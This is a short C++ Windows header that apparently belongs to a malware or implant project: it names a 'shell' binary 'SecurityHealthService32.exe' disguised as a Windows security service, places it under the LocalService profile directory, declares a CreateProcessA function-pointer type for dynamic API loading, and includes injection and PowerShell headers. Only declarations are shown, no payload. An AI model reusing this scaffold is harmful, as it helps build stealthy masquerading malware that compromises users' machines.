#pragma once
#include <Windows.h>
#include <string>
#include <iostream>

#define JOIN(x, y) x ## y
#ifdef _WIN64
#define FULL_PATH(x) JOIN("C:\\Windows\\System32\\", x)
#else
#define FULL_PATH(x) JOIN("C:\\Windows\\SysWOW64\\", x)
#endif
#define SHELL_PATH(x) JOIN("C:\\Windows\\ServiceProfiles\\LocalService\\", x)

#define SHELL_MODULE_NAME "SecurityHealthService32.exe"

using CreateProcessA_t = BOOL(WINAPI*)(
	_In_opt_		LPCSTR                lpApplicationName,
	_Inout_opt_		LPSTR                 lpCommandLine,
	_In_opt_		LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_		LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_            BOOL                  bInheritHandles,
	_In_            DWORD                 dwCreationFlags,
	_In_opt_		LPVOID                lpEnvironment,
	_In_opt_		LPCSTR                lpCurrentDirectory,
	_In_            LPSTARTUPINFOA        lpStartupInfo,
	_Out_           LPPROCESS_INFORMATION lpProcessInformation
	);


#include "injection.h"
#include "powershell.h"

bool FileExists(const char* pFilePath);